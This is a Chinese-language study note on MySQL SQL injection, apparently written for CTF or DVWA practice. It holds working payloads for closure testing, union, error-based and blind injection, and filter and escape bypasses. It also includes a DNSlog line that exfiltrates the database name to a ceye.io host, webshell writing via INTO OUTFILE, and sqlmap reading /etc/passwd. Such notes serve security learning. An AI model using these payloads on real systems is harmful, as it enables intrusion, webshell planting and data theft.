---
icon: pen-to-square
date: 2024-12-10
category:
  - 资源
tags: 
title: sql注入
---
#标记重构
# 判断SQL语句闭合方式：



## 原理1：

> **MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1"、1-等，*只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型*。**
>
> **但是，若输入的数字后面的字符恰好是闭合符，则会形成闭合，若闭合后形成的sql语句是错误的，那么sql语句执行就会错误，从而造成页面显示错误。**

​		eg：如‘1)’会被当做1处理，但是‘{1’只会被当做{处理

​		**如果’闭合时，输入1‘则其中的’会被视为后闭合符，则数据位‘1’‘，会报错，如果把’改为”则不会报错，并且1“转为1处理，可		以用这种方式判断闭合**

## 原理2：

​	**\为转义字符，可以使得闭合字符变为字符串**

## 方法1：

​	**闭合为\查看错误信息,根据错误信息判断闭合**

## 方法2：

**首先尝试：**
**?id=1’**
**?id=1”**

​	结果1：如果都报错，判断闭合符为：**整形闭合。**

**结果2：如果单引号报错，双引号不报错。**

**继续尝试**
**?id=1’ –-+**	

​	结果1：无报错，判断闭合符为：**单引号闭合。**

​	结果2：报错，判断闭合符可能为：**单引号加括号。**

**结果3：如果单引号不报错，双引号报错。**

**继续尝试**
**?id=1" -–+**

​	结果1：结果无报错，判断闭合符为：**双引号闭合。**

​	结果2：报错，判断闭合符可能为：**双引号加括号。**

## 如果是整形闭合：

**判断是否有隐式闭合**

​	![4](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/4.png)

**直到不报错为止**

## 完全盲注（不会显示错误信息，正确信息和错误信息也不区分）判断闭合方式

?id=1' and if(1=1,sleep(5),3)--+

若闭合方式为真，则会进行延迟

# 过滤掉注释符的判断闭合的判断方法
- 用?id=1' or '1' = '1'的形式判断闭合

# post，带有账户验证，且不知道账户密码，没有报错
利用万能密码测试闭合，账号密码都输入
1'or+1=1 

----

## 	**`	database()`**：(爆库名)

- ​	`database()` 是一个 SQL 函数，用于返回当前数据库的名称。

  ----------

  

# UNION联合注入

union前面的操作不可行的话，后面的操作会被单独执行

tips：**`UNION` 操作符要求所有参与的 SELECT 语句返回相同数量的列，并且这些列的顺序和数据类型也必须兼容。**

-------

# limit n1,n2 （显示排）

​	**用slelect显示行数，用limit限制行数，n1,n2,在第n1排后面显示n2个排**

​	tips：**此方法可由GROUP_CONCAT代替，用来一次性显示所有列的排**

-------

# `information_schema.tables`（爆表名）包含以下主要列：

- **TABLE_CATALOG**：表的目录。

- **TABLE_SCHEMA**：表的模式（schema），即数据库的名称。

- **TABLE_NAME**：表的名称。（爆表名用）

- **TABLE_TYPE**：表的类型，通常是`BASE TABLE`（基本表）或`VIEW`（视图）。

- **ENGINE**：表使用的存储引擎（如InnoDB、MyISAM等）。

- **ROW_FORMAT**：行格式。

- **TABLE_ROWS**：表中的行数。

- **CREATE_TIME**：表的创建时间。

- **UPDATE_TIME**：表的最后更新时间。

  # `information_schema.columns`(爆列名)包含以下主要列：

  - **TABLE_CATALOG**：表的目录（通常是数据库名）。
  
  - **TABLE_SCHEMA**：表的模式（schema），即数据库的名称。
  
  - **TABLE_NAME**：表的名称。
  
  - **COLUMN_NAME**：列的名称。
  
  - **ORDINAL_POSITION**：列在表中的位置（从1开始）。
  
  - **COLUMN_DEFAULT**：列的默认值。

  - **IS_NULLABLE**：列是否可以为NULL（YES或NO）。
  
  - **DATA_TYPE**：列的数据类型（如VARCHAR、INT等）。
  
  - **CHARACTER_MAXIMUM_LENGTH**：字符列的最大长度（适用于字符类型）。
  
  - **NUMERIC_PRECISION**：数值列的精度（适用于数值类型）。
  
  - **DATETIME_PRECISION**：日期时间列的精度。
  
    
  
    
  
    # `information_schema.schemata` (爆库名)视图通常包含以下几个重要字段：
  
    - **CATALOG_NAME**: 数据库目录的名称。
    - **SCHEMA_NAME**: 模式的名称。
    - **DEFAULT_CHARACTER_SET_NAME**: 默认字符集的名称。
    - **DEFAULT_COLLATION_NAME**: 默认排序规则的名称。
    - **SQL_PATH**: SQL 路径（如果适用）。
  
    ----
  
    
  
  # GROUP_CONCAT

**在SQL中，`GROUP_CONCAT`是一个聚合函数，用于将多个行的值连接成一个字符串，通常用于在分组查询中。**

### `**GROUP_CONCAT`的基本语法如下：**

```sql
GROUP_CONCAT(expression [ORDER BY ...] [SEPARATOR 'separator'])
```

- **expression**：要连接的列或表达式。

- **ORDER BY**：可选，指定连接值的顺序。

- **SEPARATOR**：可选，指定连接值之间的分隔符，默认为逗号（`,`）。

  tips:**只能在单独变量名中使用**，如group_concat(TABLE_NAME)，因为只是数据本身导致了多行输出，而不是表达式

----

#  CONCAT()

**是 SQL 中用于连接两个或多个字符串的函数。它可以用于将多个字符串合并为一个字符串，通常在处理文本数据时非常有用。以下是关于 `CONCAT` 函数的一些关键点和示例。**

CONCAT(string1, string2, ..., stringN)

----

# 注入方法使用优先级

联合注入

报错注入

布尔盲注

时间盲注

**特殊**

文件导入

----



# 报错注入

适用于只有错误的命令能被回显而合法命令不会回显的情况

# `updatexml()`

格式为updatexml(xml文件1,文件路径,xml文件2),常用句式 and updatexml(1,concat(表达式),1)

----



# 布尔注入(比大小)

1. 用and length(database())接比较运算符，and后数据为真才会执行

2. **得到数据库名** 

   这个时候要得到数据库名则需要使用两个函数：

   ①`ascii()`返回字符的ASCII码

   ②`substr(str,start,length)`返回字符串从str的start开始往后截取length长度的字符

   ​		或许可以用left()从左到有索引字符串

   两个函数的搭配使用：可以得到数据库名的所有字符的ascii码

   ###### ③推测数据库中的表信息
   
   该步骤需要用到information_schema数据库且包含3小步：猜表的数量–>猜表的名称的长度–>猜表的名称

###### 猜表的数量

此处需要使用到`count`函数；`COUNT()`函数是SQL中的一个聚合函数，用于计算指定列中的非空值的数量，它可以应用于不同的场景，如统计某个表中的行数、统计满足特定条件的行数等。

----

# docker进入镜像

docker exec -it 镜像id /bin/bash：/bin/bash 代表bash shell，是一个终端

----

# 文件导入

利用union后接一句话木马以及into outfile+文件绝对路径，即可导入文件，这时可能提示错误，但没关系

最后用蚁剑连接相对路径即可

注意最好把木马用“闭合，否则可能失败、

----

# 时间盲注

依靠if的特性if(条件表达式，True,False)
关键在于sleep函数

True填sleep()，意思是正确就沉默

False占位即可，错误不延迟

其他参考布尔盲注

tips：**if与原语句必须用and或or连接**，否则会报错

----

# user-agent注入
user-agent优先级在GET和POST注入之后

判断闭合:先输入'或“检查是否报错，再用' and '1' = '1检查是否报错，不报错则是'闭合,之后用报错注入即可

---
# refer头注入
在请求头中的refer中进行sql语句报错注入，同user-agent注入

----
# cookie头注入


---- 
# 注释符被过滤
 - 注释符绕过：只需要在末尾加入‘1’ = ‘1即可

----
- 对于写在后端代码的单词检测，可以使用双写绕过
	如or绕过，则information可以改为infoorrmation

对于逻辑运算符，注释符以及空格过滤：
- 空格绕过：%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%20 空格、()
- 逻辑运算符绕过：双写绕过或&&、||
- ‘:%27
# 使用\进行转义但GBK编码 绕过
- GBK编码与ascii编码对应，GBK编码可以处理两字节的“宽字节”的数据，dang用#### preg_replace 函数进行过滤时候可以在敏感字符前加入%df使得\转义失败%df与%5c(\)结合成为宽字节，形成‘縗’从而绕过转义
- 因为在爆字段时候的填写表名的时候需要采用'users'的格式，所以可以用16进制编码代替，如0x7573657273为users
----

# 堆叠注入
1. 目标存在sql注入漏洞
2. 目标未对";"号进行过滤
3. 目标中间层查询数据库信息时可同时执行多条sql语句（如使用mysqli_multi_query()函数）
用法：用;对原语句进行换行处理，然后再进行更多的sql数据库操作

----

# DNSlog外带注入
注入条件：
1. MySQL 开启 load_file ()
2. DNSLog 平台 （[Hyuga](http://hyuga.co/)、[CEYE](http://ceye.io/)）
3. MYSQL数据库在Windows 平台

适合的条件：
1. SQL盲注、无回显的命令执行、无回显的SSRF  
2. 只能用于windows系统  
3. 需要用到mysql中的load_file()函数，在Mysql中，load_file()函数读取一个文件并将其内容作为字符串返回。（不绝对，仅仅只是列举了mysql数据库的函数）

注意：  
1. 每次最多取63字节  
2. DNSlog网址前的 . 必不可少
3. `show variables like '%secure%';`查看load_file()可以读取的磁盘。

前置知识——UNC路径:
1. windows的命名惯例，可以依靠添加“`\\\\`”来引发DNS解析，`\\\\`转义后就是`\\`

示例命令：
```
?id=-1')) union SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(database())),'.m8rwsy.ceye.io\\abc')),2,3--+
```
- LOAD_FILE：关键命令，读取文件内容
- CONCAT：连接字符串
- `.m8rwsy.ceye.io\\abc`:指定的DNSlog网址
----
# 测试注释符
?id=11#1 回显admin3,说明注释符都能用 
?id=11--+1 回显admin3

----
# order by
有order by作为后端的SQL语句时，union不可用
## sqlmap
^sqlmap


![sqlmap](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/sqlmap.png)
## 补充
- 如果需要验证登录如302重定向，需要--cookie后接cookie来进行登录
- 如果url中有多个参数，用`-p`来指定参数如 `-p id`就是指定id参数
- --file-read="/etc/passwd":读取文件内容
[[DVWA#^d5e614|sqlmap应用]]